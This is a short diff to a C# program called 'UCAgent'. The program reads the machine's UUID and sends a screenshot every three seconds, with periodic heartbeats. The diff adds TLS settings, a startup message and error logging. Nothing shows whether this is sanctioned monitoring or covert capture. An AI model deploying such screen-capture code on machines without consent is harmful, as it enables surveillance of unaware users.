@@ -13,6 +13,8 @@ class UCAgent {
     static string DEVICE_ID;
     
     static void Main() {
+        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+        Console.WriteLine("UC Agent v2.2 starting...");
         try {
             var searcher = new ManagementObjectSearcher("SELECT UUID FROM Win32_ComputerSystemProduct");
             string uuid = "unknown";
@@ -25,7 +27,7 @@ class UCAgent {
             try {
                 if (n % 10 == 0) SendHeartbeat();
                 SendScreenshot();
-            } catch { }
+            } catch (Exception ex) { Console.WriteLine("ERR: " + ex.Message); }
             n++;
             Thread.Sleep(3000);
         }
